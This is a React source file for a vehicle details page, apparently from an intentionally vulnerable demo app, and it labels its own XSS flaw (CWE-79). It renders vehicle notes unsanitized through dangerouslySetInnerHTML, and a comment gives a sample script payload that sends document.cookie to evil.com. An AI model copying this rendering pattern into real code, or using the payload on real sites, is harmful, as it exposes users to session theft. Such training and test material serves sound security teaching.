/**
 * VehicleDetails Component
 * 
 * VULNERABILITY: CWE-79 - Cross-Site Scripting (XSS)
 * This component renders vehicle notes without sanitization
 */

'use client';

import { useState, useEffect } from 'react';

export default function VehicleDetails({ vehicle }) {
    const [maintenanceLogs, setMaintenanceLogs] = useState([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        const fetchMaintenanceLogs = async () => {
            try {
                const response = await fetch(
                    `http://localhost:3001/api/vehicles/${vehicle.id}/maintenance`
                );
                const data = await response.json();
                setMaintenanceLogs(data);
            } catch (error) {
                console.error('Failed to fetch maintenance logs:', error);
            } finally {
                setLoading(false);
            }
        };

        fetchMaintenanceLogs();
    }, [vehicle.id]);

    const formatCurrency = (amount) => {
        return new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD'
        }).format(amount);
    };

    const getStatusClass = (status) => {
        const classes = {
            active: 'badge badge-active',
            maintenance: 'badge badge-maintenance',
            inactive: 'badge badge-inactive'
        };
        return classes[status] || 'badge';
    };

    return (
        <div>
            {/* Vehicle Info Card */}
            <div className="card">
                <h2 className="card-title">Vehicle Information</h2>
                <div className="grid grid-2" style={{ gap: '2rem' }}>
                    <div>
                        <table className="table">
                            <tbody>
                                <tr>
                                    <td><strong>VIN</strong></td>
                                    <td>{vehicle.vin}</td>
                                </tr>
                                <tr>
                                    <td><strong>Model</strong></td>
                                    <td>{vehicle.model}</td>
                                </tr>
                                <tr>
                                    <td><strong>Year</strong></td>
                                    <td>{vehicle.year}</td>
                                </tr>
                                <tr>
                                    <td><strong>Mileage</strong></td>
                                    <td>{vehicle.mileage?.toLocaleString() || 0} miles</td>
                                </tr>
                                <tr>
                                    <td><strong>Status</strong></td>
                                    <td>
                                        <span className={getStatusClass(vehicle.status)}>
                                            {vehicle.status}
                                        </span>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    <div>
                        <h3 style={{ marginBottom: '1rem' }}>Notes</h3>
                        {/* 
              VULNERABILITY: CWE-79 - XSS
              Vehicle notes are rendered without sanitization
              Malicious payload example: <script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
            */}
                        <div
                            className="vehicle-notes"
                            dangerouslySetInnerHTML={{ __html: vehicle.notes }}
                        />
                    </div>
                </div>
            </div>

            {/* Maintenance History */}
            <div className="card" style={{ marginTop: '1.5rem' }}>
                <h2 className="card-title">Maintenance History</h2>

                {loading ? (
                    <p>Loading maintenance records...</p>
                ) : maintenanceLogs.length === 0 ? (
                    <p style={{ color: 'var(--highlight-color)' }}>No maintenance records found.</p>
                ) : (
                    <table className="table">
                        <thead>
                            <tr>
                                <th>Date</th>
                                <th>Description</th>
                                <th>Technician</th>
                                <th>Cost</th>
                            </tr>
                        </thead>
                        <tbody>
                            {maintenanceLogs.map((log) => (
                                <tr key={log.id}>
                                    <td>{new Date(log.performed_at).toLocaleDateString()}</td>
                                    <td>{log.description}</td>
                                    <td>{log.technician}</td>
                                    <td>{formatCurrency(log.cost)}</td>
                                </tr>
                            ))}
                        </tbody>
                    </table>
                )}
            </div>

            {/* Action Buttons */}
            <div style={{ marginTop: '1.5rem', display: 'flex', gap: '1rem' }}>
                <button className="btn btn-primary">Edit Vehicle</button>
                <button className="btn btn-success">Add Maintenance Log</button>
                <button className="btn btn-danger">Delete Vehicle</button>
            </div>
        </div>
    );
}
